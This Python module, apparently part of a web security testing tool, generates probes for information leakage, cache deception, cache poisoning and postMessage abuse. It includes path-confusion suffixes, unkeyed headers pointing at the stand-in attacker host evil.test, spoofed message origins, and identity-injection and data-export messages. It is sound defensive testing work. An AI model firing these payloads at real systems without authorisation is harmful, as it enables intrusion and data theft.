"""Remaining generators: info_leak, cache_deception, cache_poisoning, postmessage.

Non-destructive. Every cache probe carries {{CACHE_BUSTER}} so no shared cache
entry is ever poisoned for a real user. info_leak diffs the API response against
what the UI renders and provokes verbose errors with malformed (not dangerous)
input. postmessage only counts when data goes OUT or an injected identity is
honoured, never for an inbound-only listener.
"""

from __future__ import annotations

from .base import Ctx, TestCase

GENERATORS: dict = {}


def _gen(name):
    def deco(fn):
        GENERATORS[name] = fn
        return fn
    return deco


@_gen("info_leak")
def gen_info_leak(ctx: Ctx) -> list[TestCase]:
    cases: list[TestCase] = []
    cases.append(TestCase(case_no=0, technique="info_leak.control.normal", payload="(normal)",
                          mutation=[{"op": "as_principal", "principal": ctx.acting_principal}], is_control=True,
                          principal=ctx.acting_principal, positive={"type": "status_in", "values": [200]},
                          negative="the normal request does not return, so the tooling is broken",
                          description="control: the normal response (to diff against)"))
    n = 1
    # debug / verbosity parameter family
    for family, variant, loc, name, val in [
        ("debug", "debug_flag", "query", "debug", "1"),
        ("debug", "alt_json", "query", "alt", "json"),
        ("debug", "pretty", "query", "pretty", "true"),
        ("fields", "wildcard", "query", "fields", "*"),
        ("fields", "expand_all", "query", "expand", "all"),
        ("fields", "include", "query", "include", "all"),
        ("format", "raw", "query", "raw", "1"),
    ]:
        cases.append(TestCase(case_no=n, technique=f"info_leak.{family}.{variant}", payload=f"{name}={val}",
                              mutation=[{"op": "set_param", "location": loc, "name": name, "value": val}, {"op": "as_principal", "principal": ctx.acting_principal}],
                              positive={"type": "all", "of": [{"type": "status_in", "values": [200]},
                                                             {"type": "len_diff", "a": "this", "b": 0, "min_bytes": 64}]},
                              negative=f"the {name} parameter does not expand the response",
                              rung="debug_output", description=f"info leak via {name}={val}"))
        n += 1
    # error provocation family (malformed but harmless input -> stack trace / internal detail)
    for family, variant, muts in [
        ("error", "bad_json", [{"op": "replace_body", "body": "{", "content_type": "application/json"}]),
        ("error", "type_confuse", [{"op": "set_param", "location": "query", "name": "id", "value": "[]"}]),
        ("error", "huge_number", [{"op": "set_param", "location": "query", "name": "id", "value": "9" * 40}]),
    ]:
        cases.append(TestCase(case_no=n, technique=f"info_leak.{family}.{variant}", payload=variant,
                              mutation=muts + [{"op": "as_principal", "principal": ctx.acting_principal}],
                              positive={"type": "body_regex", "pattern": r"(?i)Traceback|Exception in|at [\w.]+\([\w.]+:\d+\)|SQLSTATE|stack trace|ORA-\d|System\.\w+Exception|/home/\w+/|[A-Z]:\\\\"},
                              negative=f"the {variant} input does not produce a verbose error or stack trace",
                              rung="debug_output", description=f"info leak via error provocation: {variant}"))
        n += 1
    # over-fetch family: the API returns fields the UI never shows (needs the UI field list)
    if ctx.extra.get("ui_fields"):
        hidden = ctx.extra.get("hidden_field_candidates", ["email", "password_hash", "ssn", "phone", "token", "secret", "internal"])
        cases.append(TestCase(case_no=n, technique="info_leak.overfetch.hidden_field", payload="diff vs UI",
                              mutation=[{"op": "as_principal", "principal": ctx.acting_principal}],
                              positive={"type": "body_regex", "pattern": r'"(' + "|".join(hidden) + r')"\s*:'},
                              negative="the API response holds no field beyond what the UI renders",
                              rung="overfetch_field", description="over-fetch: a field the UI never shows"))
        n += 1
    else:
        cases.append(TestCase(case_no=n, technique="info_leak.overfetch.diff_ui", payload="diff vs UI",
                              mutation=[{"op": "as_principal", "principal": ctx.acting_principal}],
                              positive={"type": "manual", "describe": "diff the API response fields against what the UI actually renders; a field present only in the API is over-fetching"},
                              negative="every API field is shown in the UI",
                              rung="overfetch_field", description="over-fetch: diff the API against the UI"))
        n += 1
    return cases


@_gen("cache_deception")
def gen_cache_deception(ctx: Ctx) -> list[TestCase]:
    cb = "{{CACHE_BUSTER}}"
    cases: list[TestCase] = []
    cases.append(TestCase(case_no=0, technique="cache_deception.control.authed", payload="(authed, busted)",
                          mutation=[{"op": "set_param", "location": "query", "name": "cb", "value": cb}, {"op": "as_principal", "principal": ctx.acting_principal}],
                          is_control=True, principal=ctx.acting_principal, positive={"type": "status_in", "values": [200]},
                          negative="the authed page does not load, so the tooling is broken",
                          description="control: the private page as the owner (cache-busted)"))
    n = 1
    # family = the path-confusion trick. counter_read is the SAME url fetched UNAUTHENTICATED;
    # a positive is the private body coming back without auth, which means it was cached.
    tricks = [
        ("ext", "css", f"/x-{cb}.css"),
        ("ext", "js", f"/x-{cb}.js"),
        ("ext", "json_suffix", f"/x-{cb}.json"),
        ("sep", "semicolon_css", f";{cb}.css"),
        ("path", "static_confusion", f"/..%2f{cb}static%2f"),
        ("path", "pathinfo", f"/{cb}/style.css"),
        ("encoded", "newline_css", f"/x%0a{cb}.css"),
        ("encoded", "question_css", f"/x%3f{cb}.css"),
        ("query", "fake_static", f"?{cb}=/style.css"),
        ("ext", "ico", f"/x-{cb}.ico"),
    ]
    private = ctx.extra.get("private_marker", "@")
    for family, variant, suffix in tricks:
        cases.append(TestCase(case_no=n, technique=f"cache_deception.{family}.{variant}", payload=suffix,
                              mutation=[{"op": "append_path", "suffix": suffix}, {"op": "as_principal", "principal": ctx.acting_principal}],
                              route="counter_read", positive={"type": "counter_read_contains", "value": private},
                              negative=f"the {variant} path is not cached and served to the unauthenticated reader",
                              rung="cached_private_response",
                              extra={"counter_read": {"same_as_base": True, "principal": "unauth"}},
                              description=f"cache deception: {variant}"))
        n += 1
    return cases


@_gen("cache_poisoning")
def gen_cache_poisoning(ctx: Ctx) -> list[TestCase]:
    cb = "{{CACHE_BUSTER}}"
    tok = ctx.token("p")
    cases: list[TestCase] = []
    cases.append(TestCase(case_no=0, technique="cache_poisoning.control.busted", payload="(busted baseline)",
                          mutation=[{"op": "set_param", "location": "query", "name": "cb", "value": cb}], is_control=True,
                          positive={"type": "status_in", "values": [200, 304]},
                          negative="the cache-busted baseline does not load, so the tooling is broken",
                          description="control: a unique cache key loads normally"))
    n = 1
    # family = the unkeyed header. Every probe carries its own buster so only a unique key is touched.
    headers = [
        ("xfh", "x_forwarded_host", "X-Forwarded-Host", f"{tok}.{'evil.test'}"),
        ("xfh", "x_host", "X-Host", f"{tok}.evil.test"),
        ("scheme", "x_forwarded_scheme", "X-Forwarded-Scheme", "nothttps"),
        ("scheme", "x_forwarded_proto", "X-Forwarded-Proto", "nothttps"),
        ("rewrite", "x_original_url", "X-Original-URL", f"/{tok}"),
        ("rewrite", "x_rewrite_url", "X-Rewrite-URL", f"/{tok}"),
        ("port", "x_forwarded_port", "X-Forwarded-Port", "1337"),
        ("forwarded", "rfc7239", "Forwarded", f"host={tok}.evil.test"),
        ("prefix", "x_forwarded_prefix", "X-Forwarded-Prefix", f"/{tok}"),
    ]
    for family, variant, hdr, val in headers:
        cases.append(TestCase(case_no=n, technique=f"cache_poisoning.{family}.{variant}", payload=f"{hdr}: {val}",
                              mutation=[{"op": "set_param", "location": "query", "name": "cb", "value": cb}, {"op": "set_header", "name": hdr, "value": val}],
                              positive={"type": "body_contains", "value": tok if "{tok}" not in val else tok},
                              negative=f"the {hdr} value is not reflected into the response",
                              rung="unkeyed_input_reflected",
                              extra={"cache_check": True},
                              description=f"cache poisoning probe: {hdr} (cache-busted)"))
        n += 1
    # fat GET family
    cases.append(TestCase(case_no=n, technique="cache_poisoning.fatget.body", payload="GET with body",
                          mutation=[{"op": "set_param", "location": "query", "name": "cb", "value": cb}, {"op": "replace_body", "body": f"x={tok}", "content_type": "application/x-www-form-urlencoded"}],
                          positive={"type": "body_contains", "value": tok},
                          negative="a GET body is not reflected or cached", rung="unkeyed_input_reflected",
                          description="cache poisoning: fat GET (cache-busted)"))
    n += 1
    return cases


@_gen("postmessage")
def gen_postmessage(ctx: Ctx) -> list[TestCase]:
    page = ctx.extra.get("page", "/")
    cases: list[TestCase] = []
    cases.append(TestCase(case_no=0, technique="postmessage.control.load", payload="(load listener page)",
                          mutation=[], is_control=True, route="browser",
                          positive={"type": "browser_text_contains", "value": ""},
                          negative="the listener page does not load in the private browser",
                          extra={"browser": {"open": "path", "path": page, "wait_ms": 1200}},
                          description="control: the page with the message listener loads"))
    n = 1
    tok = ctx.token("m")
    # family = origin spoof shape; the message payload asks the listener to leak data to us
    exp = ctx.extra.get("expected_origin", "lab.test")
    msgs = [
        ("star", "wildcard_target", "*"),
        ("attacker", "evil_origin", "https://evil.test"),
        ("nullorigin", "null", "null"),
        ("substring", "suffix", f"https://{exp}.evil.test"),
        ("prefix", "fragment", f"https://evil.test#{exp}"),
    ]
    for family, variant, origin in msgs:
        cases.append(TestCase(case_no=n, technique=f"postmessage.{family}.{variant}", payload=f"origin={origin}",
                              mutation=[], route="browser",
                              positive={"type": "browser_marker", "token": tok},
                              negative=f"a message from {variant} origin does not cause the listener to send data out",
                              rung="data_out_or_identity_honoured",
                              extra={"browser": {"open": "path", "path": page, "wait_ms": 1500,
                                                 "messages": [{"data": ctx.extra.get("probe_message", {"type": "getToken", "cb": tok}), "origin": origin}],
                                                 "capture_marker": tok}},
                              description=f"postMessage: {variant}-origin message, does data leave"))
        n += 1
    # identity-honoured family: inject an identity and see whether a later read honours it
    for family, variant, msg in [
        ("identity", "set_user", {"type": "setUser", "id": "{{OTHER_ID}}"}),
        ("identity", "set_role", {"type": "setRole", "role": "admin"}),
        ("exfil", "request_state", {"type": "exportState"}),
        ("exfil", "get_config", {"type": "getConfig"}),
        ("exfil", "parent_read", {"type": "readParent"}),
    ]:
        cases.append(TestCase(case_no=n, technique=f"postmessage.{family}.{variant}", payload=str(msg),
                              mutation=[], route="browser",
                              positive={"type": "browser_marker", "token": tok} if family == "exfil"
                                       else {"type": "manual", "describe": "after the injected identity message, run a counter-read as the honoured identity and confirm the server treats the viewer as that identity (not just a local UI change)"},
                              negative=f"the {variant} message neither leaks data nor is its injected identity honoured",
                              rung="data_out_or_identity_honoured",
                              extra={"browser": {"open": "path", "path": page, "wait_ms": 1500,
                                                 "messages": [{"data": msg, "origin": "https://evil.test"}], "capture_marker": tok}},
                              description=f"postMessage: {family} {variant}"))
        n += 1
    return cases
